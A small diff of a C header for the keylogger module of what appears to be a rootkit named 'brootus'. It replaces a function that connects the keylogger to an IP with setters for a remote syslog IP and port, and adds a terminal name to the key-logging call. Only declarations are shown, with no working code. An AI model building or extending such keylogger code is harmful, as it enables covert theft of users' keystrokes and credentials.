@@ -5,8 +5,9 @@
 
 BROOTUS_MODULE(keylogger);
 
-extern void connect_keylogger(char* ip_str);
-extern void log_keys(char* keys, int len);
+extern void set_syslog_ip(char* ip_str);
+extern void set_syslog_port(unsigned short port);
+extern void log_keys(char* vt_name, char* keys, int len);
 
 #endif
 
